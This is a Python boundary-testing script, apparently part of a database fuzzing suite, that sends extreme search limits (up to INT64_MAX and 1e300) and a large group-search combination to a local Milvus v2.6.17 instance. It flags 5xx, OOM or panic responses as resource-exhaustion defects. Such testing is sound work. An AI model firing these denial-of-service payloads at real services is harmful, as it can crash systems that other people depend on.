#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TestVDB Boundary Attack Script
Target: milvus v2.6.17
Attack: boundary (resource/DoS, Type3) - entities+search extreme limit values: 1e6, 1e8, INT32_MAX, INT64_MAX, float 1e9, limit*groupSize combo on group search. Defect signal = 5xx/OOM/panic, NOT acceptance
Constraint: milvus_range_entities_search_001 (window bounds, resource extreme complement)
Source: .milvus-src-2617/internal/distributed/proxy/httpserver/handler_v2.go + quota_param.go
Doc Version: v2.6.17
"""
import os, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _lib import safe_request, code_of, drop_collection, create_collection, load_collection

def ok(b):
    return code_of(b) == 0

def main():
    col = "bnd_topk_dos_017"
    drop_collection(col)
    s, b, raw = create_collection(col, with_array=False)
    if not ok(b):
        print("VERDICT: SCRIPT_ERROR - setup failed: %s" % raw[:300]); return
    load_collection(col)
    safe_request("POST", "entities+insert", {
        "collectionName": col, "data": [{"id": 1, "vector": [0.1] * 8}]})

    defects = []
    for label, limit in [
        ("limit 1e6", 1000000),
        ("limit 1e8", 100000000),
        ("INT32_MAX", 2147483647),
        ("INT64_MAX", 9223372036854775807),
        ("float 1e9", 1e9),
        ("float 1e300", 1e300),
    ]:
        t0 = time.time()
        try:
            s, b, raw = safe_request("POST", "entities+search", {
                "collectionName": col, "data": [[0.1] * 8], "limit": limit}, timeout=90)
        except Exception as e:
            print("%s -> EXC %s" % (label, e)); continue
        el = time.time() - t0
        c = code_of(b)
        print("%s -> http=%s code=%s elapsed=%.1fs raw=%s" % (label, s, c, el, raw[:180]))
        if s >= 500 or any(k in raw.lower() for k in ("oom", "out of memory", "panic",
                                                       "capacity overflow", "killed")):
            defects.append("%s -> http=%s raw=%s (resource exhaustion)" % (label, s, raw[:120]))

    # group search limit x groupSize combo
    s, b, raw = safe_request("POST", "entities+search", {
        "collectionName": col, "data": [[0.1] * 8],
        "limit": 1000000, "groupingField": "id", "groupSize": 1000000,
        "strictGroupSize": True}, timeout=90)
    print("group limit=groupSize=1e6 -> http=%s code=%s raw=%s" % (s, code_of(b), raw[:180]))
    if s >= 500 or any(k in raw.lower() for k in ("oom", "panic", "capacity overflow")):
        defects.append("group search 1e6x1e6 -> http=%s raw=%s" % (s, raw[:120]))

    # health check afterwards (container alive?)
    try:
        import requests
        h = requests.get("http://localhost:9091/healthz", timeout=5)
        print("post-attack healthz: %s" % h.text)
        if h.status_code != 200:
            defects.append("healthz degraded after extreme limits: %s" % h.status_code)
    except Exception as e:
        defects.append("healthz unreachable after attack: %s" % e)

    try:
        drop_collection(col)
    except Exception:
        pass

    if defects:
        for d in defects:
            print("DEFECT: %s" % d)
        print("VERDICT: DEFECT_FOUND (Type3_RuntimeFailure) - resource exhaustion on extreme limit")
    else:
        print("VERDICT: NO_DEFECT")

if __name__ == "__main__":
    main()
